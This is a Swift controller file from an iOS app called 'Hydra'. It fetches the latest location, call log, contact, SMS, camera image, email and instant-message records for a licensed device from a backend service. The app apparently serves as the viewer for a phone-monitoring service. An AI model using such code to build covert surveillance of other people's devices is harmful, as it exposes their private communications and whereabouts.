//
//  ChronologicalController.swift
//  Hydra
//
//  Created by Chanin Nokpet on 12/30/16.
//  Copyright © 2016 Makara Khloth. All rights reserved.
//

import UIKit
import MangroveServiceManager

protocol ChronologicalControllerDelegate {
    func chronologicalControllerRequestCompleted(itemWithLastRecord: ChronologicalItem)
    func chronologicalControllerRequestError(error: Error)
}

class ChronologicalController: NSObject  {
    
    var delegate: ChronologicalControllerDelegate?
    var chronologicalItem: ChronologicalItem!
    
    //MARK: - Methods
    func requestLastRecord() {
        chronologicalItem.isRequested = true
        if let imConversation = chronologicalItem.item as? IMConversation {
            requestIMLastRecord(conversation: imConversation)
        } else if let feature = chronologicalItem.item as? Feature {
            requestFeatureLastRecord(feature: feature)
        }
    }
    
    private func requestIMLastRecord(conversation:IMConversation) {
        let msController = HydraController.sharedInstance.msController
        let request = MSGetIMRequest()
        request.deviceId = HydraController.sharedInstance.logonUser.license?.device?.ID
        request.conversationId = conversation.conversationId
        request.pageSize = 1
        request.delegate = self
        msController.send(request: request)
    }
    
    private func requestFeatureLastRecord(feature: Feature) {
        let msController = HydraController.sharedInstance.msController
        
        let featureName = feature.featureName ?? ""
        var request: MSRequest!
        switch featureName {
        case "Location":
            request = MSGetLocationRequest()
        case "Call":
            request = MSGetCallLogRequest()
        case "AddressBook":
            request = MSGetAddressBookRequest()
        case "SMS":
            request = MSGetSMSRequest()
        case "CameraImage":
            request = MSGetCameraImageRequest()
        case "Email":
            request = MSGetMailRequest()
            
        default:
            return
        }
        
        request.deviceId = HydraController.sharedInstance.logonUser.license?.device?.ID
        request.delegate = self
        msController.send(request: request)
    }
}

extension ChronologicalController: MangroveServiceManagerDelegate {
    func requestCompleted(request: MSRequest, response: MSResponse?) {
        chronologicalItem.isRequested = true
        switch response {
        case let response as MSGetIMResponse:
            if let imRecord = response.records?.first {
                chronologicalItem.lastMessage = imRecord.data
                chronologicalItem.imageUrl = imRecord.thumbailImageUrl
                chronologicalItem.datetime = imRecord.userTime
                chronologicalItem.correspondingObject = imRecord
            }
        case let response as MSGetLocationResponse:
            if let record = response.location {
                chronologicalItem.correspondingObject = record
                chronologicalItem.lastMessage = record.cellName
                chronologicalItem.datetime = record.userTime
            }
        case let response as MSGetCallLogResponse:
            if let record = response.callLogs?.first {
                chronologicalItem.correspondingObject = record
                chronologicalItem.datetime = record.userTime
                chronologicalItem.lastMessage = record.contactName
            }
        case let response as MSGetAddressBookResponse:
            if let record = response.contacts?.first {
                chronologicalItem.correspondingObject = record
                chronologicalItem.lastMessage = "\(record.firstname ?? "") \(record.lastname ?? "")"
                chronologicalItem.datetime = response.userTime
                chronologicalItem.imageUrl = record.contactPicURL
            }
        case let response as MSGetSMSResponse:
            if let record = response.smses?.first {
                chronologicalItem.correspondingObject = record
                chronologicalItem.datetime = record.userTime
                chronologicalItem.lastMessage = record.smsData
            }
        case let response as MSGetCameraImageResponse:
            if let record = response.images?.first {
                chronologicalItem.correspondingObject = record
                chronologicalItem.datetime = record.userTime
                chronologicalItem.imageUrl = record.imageThumbnailURL
                chronologicalItem.lastMessage = record.fileName
            }
        case let response as MSGetMailResponse:
            if let record = response.mails?.first {
                chronologicalItem.lastMessage = record.subject
                chronologicalItem.datetime = record.userTime
                chronologicalItem.correspondingObject = record
            }
            
        default:
            print("Cannot Hanndle a response")
        }
        delegate?.chronologicalControllerRequestCompleted(itemWithLastRecord: chronologicalItem)
    }
    
    func requestError(error: Error?) {
        delegate?.chronologicalControllerRequestError(error: error!)
    }
}
